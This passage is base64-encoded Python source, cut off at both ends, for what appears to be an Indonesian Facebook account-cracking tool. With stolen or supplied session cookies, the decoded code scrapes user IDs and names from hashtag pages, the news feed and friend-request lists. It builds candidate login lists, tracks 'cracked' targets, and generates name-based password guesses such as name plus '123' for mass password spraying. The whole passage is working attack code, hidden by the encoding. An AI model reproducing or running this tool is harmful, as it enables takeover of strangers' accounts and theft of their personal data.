CIgIiwiXyIpDQogICAgdHJ5Om9zLnJlbW92ZShfZmlsZV8pDQogICAgZXhjZXB0OnBhc3MNCiAgICBleGVjX3VzZXJuYW1lKF9xdWVyeV8sX2xpbWl0X2F3YWxfLF9saW1pdF9ha2hpcl8sX2ZpbGVfKQ0KZGVmIGV4ZWNfdXNlcm5hbWUoX19xdWVyeV9fLF9saW1pdF9hd2FsXyxfbGltaXRfYWtoaXJfLF9maWxlXyk6DQogICAgX2hpdHVuZ19lbWFpbF8xXyA9IF9saW1pdF9hd2FsXysxO19oaXR1bmdfZW1haWxfMl8gPSBfbGltaXRfYXdhbF8rMTtfaGl0dW5nX2VtYWlsXzNfID0gX2xpbWl0X2F3YWxfKzE7X2hpdHVuZ19lbWFpbF9mdWxsXyA9IF9saW1pdF9hd2FsXysxDQogICAgaWYgJyAnIGluIF9fcXVlcnlfXzoNCiAgICAgICAgdHJ5Ol9xdWVyeV8xXyA9IF9fcXVlcnlfXy5zcGxpdCgnICcpWzBdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHRyeTpfcXVlcnlfMl8gPSBfX3F1ZXJ5X18uc3BsaXQoJyAnKVsxXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICB0cnk6X3F1ZXJ5XzNfID0gX19xdWVyeV9fLnNwbGl0KCcgJylbMl0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICBlbGlmICcuJyBpbiBfX3F1ZXJ5X186DQogICAgICAgIHRyeTpfcXVlcnlfMV8gPSBfX3F1ZXJ5X18uc3BsaXQoJy4nKVswXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICB0cnk6X3F1ZXJ5XzJfID0gX19xdWVyeV9fLnNwbGl0KCcuJylbMV0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgdHJ5Ol9xdWVyeV8zXyA9IF9fcXVlcnlfXy5zcGxpdCgnLicpWzJdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgZWxpZiAnXycgaW4gX19xdWVyeV9fOg0KICAgICAgICB0cnk6X3F1ZXJ5XzFfID0gX19xdWVyeV9fLnNwbGl0KCdfJylbMF0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgdHJ5Ol9xdWVyeV8yXyA9IF9fcXVlcnlfXy5zcGxpdCgnXycpWzFdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHRyeTpfcXVlcnlfM18gPSBfX3F1ZXJ5X18uc3BsaXQoJ18nKVsyXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgIGVsaWYgJy0nIGluIF9fcXVlcnlfXzoNCiAgICAgICAgdHJ5Ol9xdWVyeV8xXyA9IF9fcXVlcnlfXy5zcGxpdCgnLScpWzBdDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgIHRyeTpfcXVlcnlfMl8gPSBfX3F1ZXJ5X18uc3BsaXQoJy0nKVsxXQ0KICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICB0cnk6X3F1ZXJ5XzNfID0gX19xdWVyeV9fLnNwbGl0KCctJylbMl0NCiAgICAgICAgZXhjZXB0OnBhc3MNCiAgICBlbHNlOg0KICAgICAgICB0cnk6X3F1ZXJ5XzFfID0gX19xdWVyeV9fDQogICAgICAgIGV4Y2VwdDpwYXNzDQogICAgdHJ5IDoNCiAgICAgICAgZm9yIF9qdW1sYWhfIGluIHJhbmdlKF9saW1pdF9hd2FsXyxfbGltaXRfYWtoaXJfKToNCiAgICAgICAgICAgIHRyeTpuYW1hID0gX3F1ZXJ5XzFfO2VtYWlsID0gKCclcyVzJyUoX3F1ZXJ5XzFfLHN0cihfaGl0dW5nX2VtYWlsXzFfKSkpO19hemltdmF1X2RhcHVudGFfKF9maWxlXywnYSsnKS53cml0ZSgnJXPigKIlc1xuJyUoZW1haWwsbmFtYSkpO19oaXR1bmdfZW1haWxfMV8gKz0gMQ0KICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgICAgIGZvciBfanVtbGFoXyBpbiByYW5nZShfbGltaXRfYXdhbF8sX2xpbWl0X2FraGlyXyk6DQogICAgICAgICAgICB0cnk6bmFtYSA9IF9xdWVyeV8yXztlbWFpbCA9ICgnJXMlcyclKF9xdWVyeV8yXyxzdHIoX2hpdHVuZ19lbWFpbF8yXykpKTtfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8sJ2ErJykud3JpdGUoJyVz4oCiJXNcbiclKGVtYWlsLG5hbWEpKTtfaGl0dW5nX2VtYWlsXzJfICs9IDENCiAgICAgICAgICAgIGV4Y2VwdDpjb250aW51ZQ0KICAgICAgICBmb3IgX2p1bWxhaF8gaW4gcmFuZ2UoX2xpbWl0X2F3YWxfLF9saW1pdF9ha2hpcl8pOg0KICAgICAgICAgICAgdHJ5Om5hbWEgPSBfcXVlcnlfM187ZW1haWwgPSAoJyVzJXMnJShfcXVlcnlfM18sc3RyKF9oaXR1bmdfZW1haWxfM18pKSk7X2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfLCdhKycpLndyaXRlKCclc+KAoiVzXG4nJShlbWFpbCxuYW1hKSk7X2hpdHVuZ19lbWFpbF8zXyArPSAxDQogICAgICAgICAgICBleGNlcHQ6Y29udGludWUNCiAgICAgICAgZm9yIF9qdW1sYWhfIGluIHJhbmdlKF9saW1pdF9hd2FsXyxfbGltaXRfYWtoaXJfKToNCiAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICBpZiAnLicgaW4gX19xdWVyeV9fOl9xdWVyeV8gPSBfX3F1ZXJ5X187bmFtYSA9IF9fcXVlcnlfXy5yZXBsYWNlKCcuJywnICcpDQogICAgICAgICAgICAgICAgZWxpZiAnXycgaW4gX19xdWVyeV9fOl9xdWVyeV8gPSBfX3F1ZXJ5X187bmFtYSA9IF9fcXVlcnlfXy5yZXBsYWNlKCdfJywnICcpDQogICAgICAgICAgICAgICAgZWxpZiAnLScgaW4gX19xdWVyeV9fOl9xdWVyeV8gPSBfX3F1ZXJ5X187bmFtYSA9IF9fcXVlcnlfXy5yZXBsYWNlKCctJywnICcpDQogICAgICAgICAgICAgICAgZWxzZTpfcXVlcnlfID0gX19xdWVyeV9fLnJlcGxhY2UoJyAnLCcnKTtuYW1hID0gX19xdWVyeV9fDQogICAgICAgICAgICAgICAgZW1haWwgPSAoJyVzJXMnJShfcXVlcnlfLHN0cihfaGl0dW5nX2VtYWlsX2Z1bGxfKSkpO19hemltdmF1X2RhcHVudGFfKF9maWxlXywnYSsnKS53cml0ZSgnJXPigKIlc1xuJyUoZW1haWwsbmFtYSkpO19oaXR1bmdfZW1haWxfZnVsbF8gKz0gMQ0KICAgICAgICAgICAgZXhjZXB0OmNvbnRpbnVlDQogICAgZXhjZXB0OmphbGFuKCclcyBbJXMhJXNdICVzVEhFUkUgSVMgQU4gRVJST1InJShNLFAsTSxQKSk7dGltZS5zbGVlcCgyKTttZW51KCkNCiAgICBfYnVrYV9maWxlXyA9IF9hemltdmF1X2RhcHVudGFfKF9maWxlXywncicpLnJlYWQoKS5zcGxpdGxpbmVzKCk7cHJpbnQoIiVzIFslc+KAoiVzXSAlc1RPVEFMIElEIDogJXMlcyIlKEgsUCxILEssSCxzdHIobGVuKF9idWthX2ZpbGVfKSkpKQ0KICAgIHJldHVybiBjcmFjayhfZmlsZV8pDQoNCiMjIyBEdW1wIElEIERhcmkgSGFzaHRhZw0KZGVmIGhhc2h0YWcoY29va2llcyk6DQogICAgX3F1ZXJ5XyA9IF9jaWNpX2F6aW12YXVfKCclcyBbJXPigKIlc10gJXNFTlRFUiBIQVNIVEFHIDogJyUoSCxQLEgsQikpO191cmxfZGV2XyA9ICdodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vaGFzaHRhZy8nICsgX3F1ZXJ5XztfZmlsZV8gPSAoX3F1ZXJ5XysnLmpzb24nKS5yZXBsYWNlKCcgJywnXycpDQogICAgdHJ5Om9zLnJlbW92ZShfZmlsZV8pDQogICAgZXhjZXB0OnBhc3MNCiAgICBwcmludCgiJXMgWyVz4oCiJXNdICVzUFJFU1MgQ1RSTCtDIFRPIFNUT1AgRFVNUCIlKEgsUCxILEspKTtleGVjX2hhc2h0YWcoX3VybF9kZXZfLGNvb2tpZXMsX2ZpbGVfKTtwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSk7cmV0dXJuIGNyYWNrKF9maWxlXykNCmRlZiBleGVjX2hhc2h0YWcodXJsLGNvb2tpZXMsX2ZpbGVfKToNCiAgICBvcGVuKF9maWxlXywnYScpO19yZXFfc2VzXyA9IHJlcXVlc3RzLlNlc3Npb24oKTtfcmVxX2dldF8gPSBfcmVxX3Nlc18uZ2V0KHVybCxjb29raWVzPWNvb2tpZXMsaGVhZGVycz1oZWFkZXJfaGFzaHRhZyk7X3NvcF9kZXZfID0gcGFyKF9yZXFfZ2V0Xy50ZXh0LCdodG1sLnBhcnNlcicpO19idWthX2ZpbGVfID0gb3BlbihfZmlsZV8pLnJlYWQoKTtwcmludCAoIlxyJXMgWyVz4oCiJXNdICVzVEFLSU5HICVzJXMgSUQiJShILFAsSCxLLEgsbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpLnNwbGl0bGluZXMoKSkpLGVuZD0nJyk7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgdHJ5Og0KICAgICAgICBmb3IgX2NpY2lfIGluIF9zb3BfZGV2Xy5maW5kX2FsbCgnaDMnKToNCiAgICAgICAgICAgIGZvciBfYXppbXZhdV8gaW4gX2NpY2lfLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAgICAgICAgIGlmICdtYmFzaWMuZmFjZWJvb2suY29tJyBpbiBfYXppbXZhdV8uZ2V0KCdocmVmJyk6cGFzcw0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGlmICJwcm9maWxlLnBocCIgaW4gX2F6aW12YXVfLmdldCgnaHJlZicpOg0KICAgICAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9uYW1lX2Rldl8gPSBfYXppbXZhdV8udGV4dDtfaWRfZGV2XyA9ICIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoInByb2ZpbGVcLnBocFw/aWQ9KC4qPykmIixfYXppbXZhdV8uZ2V0KCJocmVmIikpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIF9uYW1lX2Rldl8gaW4gX2J1a2FfZmlsZV86cGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJy8nIGluIF9pZF9kZXZfOnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlOm9wZW4oX2ZpbGVfLCdhKycpLndyaXRlKCclc+KAoiVzXG4nJShfaWRfZGV2XyxfbmFtZV9kZXZfKSkNCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgICAgICB0cnk6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgX25hbWVfZGV2XyA9IF9hemltdmF1Xy50ZXh0O19pZF9kZXZfID0gIiIuam9pbihiczQucmUuZmluZGFsbCgiLyguKj8pXD8iLF9hemltdmF1Xy5nZXQoImhyZWYiKSkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgX25hbWVfZGV2XyBpbiBfYnVrYV9maWxlXzpwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxpZiAnLycgaW4gX2lkX2Rldl86cGFzcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6b3BlbihfZmlsZV8sJ2ErJykud3JpdGUoJyVz4oCiJXNcbiclKF9pZF9kZXZfLF9uYW1lX2Rldl8pKQ0KICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgIGZvciBfYXppbXZhdV8gaW4gX3NvcF9kZXZfLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAgICAgICAgIGlmICdTZWUgTW9yZSBSZXN1bHRzJyBpbiBfYXppbXZhdV8udGV4dDp1cmxfZGV2ID0gX2F6aW12YXVfLmdldCgnaHJlZicpO2V4ZWNfaGFzaHRhZyh1cmxfZGV2LGNvb2tpZXMsX2ZpbGVfKQ0KICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDpwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSk7cmV0dXJuIGNyYWNrKF9maWxlXykNCg0KDQpkZWYgYmVyYW5kYShjb29raWVzKToNCiAgICBfdXJsX2Rldl8gPSAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2hvbWUucGhwJztfZmlsZV8gPSAnYmVyYW5kYS5qc29uJw0KICAgIHRyeTpvcy5yZW1vdmUoX2ZpbGVfKQ0KICAgIGV4Y2VwdDpwYXNzDQogICAgcHJpbnQoIiVzIFslc+KAoiVzXSAlc1BSRVNTIENUUkwrQyBUTyBTVE9QIERVTVAiJShILFAsSCxLKSk7ZXhlY19iZXJhbmRhKF91cmxfZGV2Xyxjb29raWVzLF9maWxlXyk7cHJpbnQoIlxuJXMgWyVz4oCiJXNdICVzU1VDQ0VTU0ZVTCBEVU1QICVzIElEIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfKS5yZWFkKCkuc3BsaXRsaW5lcygpKSkpO3JldHVybiBjcmFjayhfZmlsZV8pDQpkZWYgZXhlY19iZXJhbmRhKHVybCxjb29raWVzLF9maWxlXyk6DQogICAgb3BlbihfZmlsZV8sJ2EnKTtfcmVxX3Nlc18gPSByZXF1ZXN0cy5TZXNzaW9uKCk7X3JlcV9nZXRfID0gX3JlcV9zZXNfLmdldCh1cmwsY29va2llcz1jb29raWVzLGhlYWRlcnM9aGVhZGVyX25hbWEpO19zb3BfZGV2XyA9IHBhcihfcmVxX2dldF8udGV4dCwnaHRtbC5wYXJzZXInKTtfYnVrYV9maWxlXyA9IG9wZW4oX2ZpbGVfKS5yZWFkKCk7cHJpbnQgKCJcciVzIFslc+KAoiVzXSAlc1RBS0lORyAlcyVzIElEIiUoSCxQLEgsSyxILGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSxlbmQ9JycpO3N5cy5zdGRvdXQuZmx1c2goKQ0KICAgIHRyeToNCiAgICAgICAgZm9yIF9jaWNpXyBpbiBfc29wX2Rldl8uZmluZF9hbGwoJ2gzJyk6DQogICAgICAgICAgICBmb3IgX2F6aW12YXVfIGluIF9jaWNpXy5maW5kX2FsbCgnYScsaHJlZj1UcnVlKToNCiAgICAgICAgICAgICAgICBpZiAicHJvZmlsZS5waHAiIGluIF9hemltdmF1Xy5nZXQoJ2hyZWYnKToNCiAgICAgICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAgICAgX25hbWVfZGV2XyA9IF9hemltdmF1Xy50ZXh0O19pZF9kZXZfID0gIiIuam9pbihiczQucmUuZmluZGFsbCgicHJvZmlsZVwucGhwXD9pZD0oLio/KSYiLF9hemltdmF1Xy5nZXQoImhyZWYiKSkpDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBfbmFtZV9kZXZfIGluIF9idWthX2ZpbGVfOnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsaWYgJy8nIGluIF9pZF9kZXZfOnBhc3MNCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6b3BlbihfZmlsZV8sJ2ErJykud3JpdGUoJyVz4oCiJXNcbiclKF9pZF9kZXZfLF9uYW1lX2Rldl8pKQ0KICAgICAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIHRyeToNCiAgICAgICAgICAgICAgICAgICAgICAgIF9uYW1lX2Rldl8gPSBfYXppbXZhdV8udGV4dDtfaWRfZGV2XyA9ICIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoIi8oLio/KVw/IixfYXppbXZhdV8uZ2V0KCJocmVmIikpKQ0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgX25hbWVfZGV2XyBpbiBfYnVrYV9maWxlXzpwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICBlbGlmICcvJyBpbiBfaWRfZGV2XzpwYXNzDQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOm9wZW4oX2ZpbGVfLCdhKycpLndyaXRlKCclc+KAoiVzXG4nJShfaWRfZGV2XyxfbmFtZV9kZXZfKSkNCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OnBhc3MNCiAgICAgICAgICAgIGZvciBfYXppbXZhdV8gaW4gX3NvcF9kZXZfLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAgICAgICAgIGlmICdTZWUgTW9yZSBTdG9yaWVzJyBpbiBfYXppbXZhdV8udGV4dDp1cmxfZGV2ID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8nICsgX2F6aW12YXVfLmdldCgnaHJlZicpO2V4ZWNfYmVyYW5kYSh1cmxfZGV2LGNvb2tpZXMsX2ZpbGVfKQ0KICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDpwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSk7cmV0dXJuIGNyYWNrKF9maWxlXykNCg0KZGVmIHBlcm1pbnRhYW5fcGVydGVtYW5hbl9tYXN1ayhjb29raWVzKToNCiAgICBfdXJsX2Rldl8gPSAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tL2ZyaWVuZHMvY2VudGVyL3JlcXVlc3RzJztfZmlsZV8gPSAnZnJpZW5kX2xvZ2luLmpzb24nDQogICAgdHJ5Om9zLnJlbW92ZShfZmlsZV8pDQogICAgZXhjZXB0OnBhc3MNCiAgICBwcmludCgiJXMgWyVz4oCiJXNdICVzUFJFU1MgQ1RSTCtDIFRPIFNUT1AgRFVNUCIlKEgsUCxILEspKTtleGVjX3Blcm1pbnRhYW5fcGVydGVtYW5hbl9tYXN1ayhfdXJsX2Rldl8sY29va2llcyxfZmlsZV8pO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCIlKEgsUCxILEssbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpLnNwbGl0bGluZXMoKSkpKTtyZXR1cm4gY3JhY2soX2ZpbGVfKQ0KZGVmIGV4ZWNfcGVybWludGFhbl9wZXJ0ZW1hbmFuX21hc3VrKHVybCxjb29raWVzLF9maWxlXyk6DQogICAgb3BlbihfZmlsZV8sJ2EnKTtfcmVxX3Nlc18gPSByZXF1ZXN0cy5TZXNzaW9uKCk7X3JlcV9nZXRfID0gX3JlcV9zZXNfLmdldCh1cmwsY29va2llcz1jb29raWVzLGhlYWRlcnM9aGVhZGVyX25hbWEpO19zb3BfZGV2XyA9IHBhcihfcmVxX2dldF8udGV4dCwnaHRtbC5wYXJzZXInKTtwcmludCAoIlxyJXMgWyVz4oCiJXNdICVzVEFLSU5HICVzJXMgSUQiJShILFAsSCxLLEgsbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpLnNwbGl0bGluZXMoKSkpLGVuZD0nJyk7c3lzLnN0ZG91dC5mbHVzaCgpDQogICAgdHJ5Og0KICAgICAgICBmb3IgX2F6aW12YXVfIGluIF9zb3BfZGV2Xy5maW5kX2FsbCgnYScsaHJlZj1UcnVlKToNCiAgICAgICAgICAgIGlmICcvZnJpZW5kcy9ob3ZlcmNhcmQnIGluIF9hemltdmF1Xy5nZXQoJ2hyZWYnKToNCiAgICAgICAgICAgICAgICB0cnk6X25hbWVfZGV2XyA9IF9hemltdmF1Xy50ZXh0O19pZF9kZXZfID0gIiIuam9pbihiczQucmUuZmluZGFsbCgndWlkPSguKj8pJicsX2F6aW12YXVfLmdldCgnaHJlZicpKSk7b3BlbihfZmlsZV8sJ2ErJykud3JpdGUoJyVz4oCiJXNcbiclKF9pZF9kZXZfLF9uYW1lX2Rldl8pKQ0KICAgICAgICAgICAgICAgIGV4Y2VwdDpwYXNzDQogICAgICAgICAgICBlbHNlOnBhc3MNCiAgICAgICAgZm9yIF9hemltdmF1XyBpbiBfc29wX2Rldl8uZmluZF9hbGwoJ2EnLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICBpZiAnU2VlIE1vcmUnIGluIF9hemltdmF1Xy50ZXh0OnVybF9kZXYgPSAnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tLycgKyBfYXppbXZhdV8uZ2V0KCdocmVmJyk7ZXhlY19wZXJtaW50YWFuX3BlcnRlbWFuYW5fbWFzdWsodXJsX2Rldixjb29raWVzLF9maWxlXykNCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6cHJpbnQoIlxuJXMgWyVz4oCiJXNdICVzU1VDQ0VTU0ZVTCBEVU1QICVzIElEIiUoSCxQLEgsSyxsZW4oX2F6aW12YXVfZGFwdW50YV8oX2ZpbGVfKS5yZWFkKCkuc3BsaXRsaW5lcygpKSkpO3JldHVybiBjcmFjayhfZmlsZV8pDQoNCg0KZGVmIHBlcm1pbnRhYW5fcGVydGVtYW5hbl9rZWx1YXIoY29va2llcyk6DQogICAgX3VybF9kZXZfID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS9mcmllbmRzL2NlbnRlci9yZXF1ZXN0cy9vdXRnb2luZyc7X2ZpbGVfID0gJ2ZyaWVuZF9vdXQuanNvbicNCiAgICB0cnk6b3MucmVtb3ZlKF9maWxlXykNCiAgICBleGNlcHQ6cGFzcw0KICAgIHByaW50KCIlcyBbJXPigKIlc10gJXNQUkVTUyBDVFJMK0MgVE8gU1RPUCBEVU1QIiUoSCxQLEgsSykpO2V4ZWNfcGVybWludGFhbl9wZXJ0ZW1hbmFuX2tlbHVhcihfdXJsX2Rldl8sY29va2llcyxfZmlsZV8pO3ByaW50KCJcbiVzIFslc+KAoiVzXSAlc1NVQ0NFU1NGVUwgRFVNUCAlcyBJRCIlKEgsUCxILEssbGVuKF9hemltdmF1X2RhcHVudGFfKF9maWxlXykucmVhZCgpLnNwbGl0bGluZXMoKSkpKTtyZXR1cm4gY3JhY2soX2ZpbGVfKQ0KZGVmIGV4ZWNfcGVybWludGFhbl9wZXJ0ZW1hbmFuX2tlbHVhcih1cmwsY29va2llcyxfZmlsZV8pOg0KICAgIG9wZW4oX2ZpbGVfLCdhJyk7X3JlcV9zZXNfID0gcmVxdWVzdHMuU2Vzc2lvbigpO19yZXFfZ2V0XyA9IF9yZXFfc2VzXy5nZXQodXJsLGNvb2tpZXM9Y29va2llcyxoZWFkZXJzPWhlYWRlcl9uYW1hKTtfc29wX2Rldl8gPSBwYXIoX3JlcV9nZXRfLnRleHQsJ2h0bWwucGFyc2VyJyk7cHJpbnQgKCJcciVzIFslc+KAoiVzXSAlc1RBS0lORyAlcyVzIElEIiUoSCxQLEgsSyxILGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSxlbmQ9JycpO3N5cy5zdGRvdXQuZmx1c2goKQ0KICAgIHRyeToNCiAgICAgICAgZm9yIF9hemltdmF1XyBpbiBfc29wX2Rldl8uZmluZF9hbGwoJ2EnLGhyZWY9VHJ1ZSk6DQogICAgICAgICAgICBpZiAnL2ZyaWVuZHMvaG92ZXJjYXJkJyBpbiBfYXppbXZhdV8uZ2V0KCdocmVmJyk6DQogICAgICAgICAgICAgICAgdHJ5Ol9uYW1lX2Rldl8gPSBfYXppbXZhdV8udGV4dDtfaWRfZGV2XyA9ICIiLmpvaW4oYnM0LnJlLmZpbmRhbGwoJ3VpZD0oLio/KSYnLF9hemltdmF1Xy5nZXQoJ2hyZWYnKSkpO29wZW4oX2ZpbGVfLCdhKycpLndyaXRlKCclc+KAoiVzXG4nJShfaWRfZGV2XyxfbmFtZV9kZXZfKSkNCiAgICAgICAgICAgICAgICBleGNlcHQ6cGFzcw0KICAgICAgICAgICAgZWxzZTpwYXNzDQogICAgICAgIGZvciBfYXppbXZhdV8gaW4gX3NvcF9kZXZfLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOg0KICAgICAgICAgICAgaWYgJ1NlZSBNb3JlJyBpbiBfYXppbXZhdV8udGV4dDp1cmxfZGV2ID0gJ2h0dHBzOi8vbWJhc2ljLmZhY2Vib29rLmNvbS8nICsgX2F6aW12YXVfLmdldCgnaHJlZicpO2V4ZWNfcGVybWludGFhbl9wZXJ0ZW1hbmFuX2tlbHVhcih1cmxfZGV2LGNvb2tpZXMsX2ZpbGVfKQ0KICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDpwcmludCgiXG4lcyBbJXPigKIlc10gJXNTVUNDRVNTRlVMIERVTVAgJXMgSUQiJShILFAsSCxLLGxlbihfYXppbXZhdV9kYXB1bnRhXyhfZmlsZV8pLnJlYWQoKS5zcGxpdGxpbmVzKCkpKSk7cmV0dXJuIGNyYWNrKF9maWxlXykNCg0KIyMjIENlayBUYXJnZXQgQ3JhY2sNCmRlZiBjZWtfdGFyZ2V0X2NyYWNrXyhfaWRfKToNCiAgICBvcGVuKCdsaXN0X2lkLnR4dCcsJ2ErJykNCiAgICB0cnk6DQogICAgICAgIF9jZWtfID0gb3BlbignbGlzdF9pZC50eHQnLCdyJykucmVhZCgpDQogICAgICAgIGlmIF9pZF8gaW4gX2Nla186DQogICAgICAgICAgICBpZiBfaWRfID09ICdtZSc6cGFzcw0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICBfY29renpfID0gX2NpY2lfYXppbXZhdV8oJyVzIFslcyElc10gJXNJRCBIQVMgQkVFTiBDUkFDS0VELCBDT05USU5VRT8gW1kvbl0gOiAnJShNLFAsTSxQKSkNCiAgICAgICAgICAgICAgICBpZiBfY29renpfIGluIFsnJywnICddOnBhc3MNCiAgICAgICAgICAgICAgICBlbGlmIF9jb2t6el8gaW4gWycxJywnMDEnLCd5J106cGFzcw0KICAgICAgICAgICAgICAgIGVsaWYgX2Nva3p6XyBpbiBbJzInLCcwJywnbiddOm1lbnUoKQ0KICAgICAgICAgICAgICAgIGVsc2U6cGFzcw0KICAgICAgICBlbHNlOl9hemltdmF1X2RhcHVudGFfKCdsaXN0X2lkLnR4dCcsImErIikud3JpdGUoIiVzXG4iJShfaWRfKSkNCiAgICBleGNlcHQ6cGFzcw0KDQojIyMgR2VuZXJhdGUgUGFzc3dvcmQNCmRlZiBnZW5lcmF0ZTEoX2NpY2lfKToNCiAgICBfYXppbXZhdV89W10NCiAgICBmb3IgaSBpbiBfY2ljaV8uc3BsaXQoIiAiKToNCiAgICAgICAgaWYgbGVuKGkpPDM6Y29udGludWUgDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBpPWkubG93ZXIoKQ0KICAgICAgICAgICAgaWYgbGVuKGkpPT0zIG9yIGxlbihpKT09NCBvciBsZW4oaSk9PTU6X2F6aW12YXVfLmFwcGVuZChpKyIxMjMiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyMzQ1IikNCiAgICAgICAgICAgIGVsaWYgbGVuKGkpPj02Ol9hemltdmF1Xy5hcHBlbmQoaSk7X2F6aW12YXVfLmFwcGVuZChpKyIxMjMiKTtfYXppbXZhdV8uYXBwZW5kKGkrIjEyMzQ1IikNCiAgICAgICAgICAgIGVsc2U6Y29udGludWUNCiAgICBfYXppbXZhdV8uYXBwZW5kKF9jaWNpXy5sb3dlcigpKQ0KICAgIHJldHVybiBfYXppbXZhdV8NCg0KZGVmIGdlbmVyYXRlMihfY2ljaV8pOg0KICAgIF9hemltdmF1Xz1bXQ0KICAgIGZvciBpIGluIF9jaWNpXy5zcGxpdCgiICIpOg0KICAgICAgICBpZiBsZW4oaSk8Mzpjb250aW51ZQ0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgaT1pLmxvd2VyKCkNCiAgICAgICAgICAgIGlmIGxlbihpKT09MyBvciBsZW4oaSk9PTQgb3IgbGVuKGkpPT01Ol9hemltdmF1Xy5hcHBlbmQoaSsiMTIzIik7X2F6aW12YXVfLmFwcGVuZChpKyIxMjM0Iik7X2F6aW12YXVfLmFwcGVuZChpKyIxMjM0NSIpDQogICAgICAgICAgICBlbHNlOl9hemltdmF1Xy5hcHBlbmQoaSk7X2F6aW12YXVfLmFwcGVuZChpKyIxMiIpO19hemltdmF1Xy5hcHBlbmQoaSsiMTIzIik7X2F6aW12YXVfLmFwcGVuZChpKyIxMjM0Iik7X2F6aW12YXVfLmFwcGVuZChpKyIxMjM0NSIpDQogICAgX2F6aW12YXVfLmFwcGVuZChfY2ljaV8ubG93ZXIoKSk7X2F6aW12YXVfLmFwcGVuZChfY2ljaV8ubG93ZXIoKS5zcGxpdCg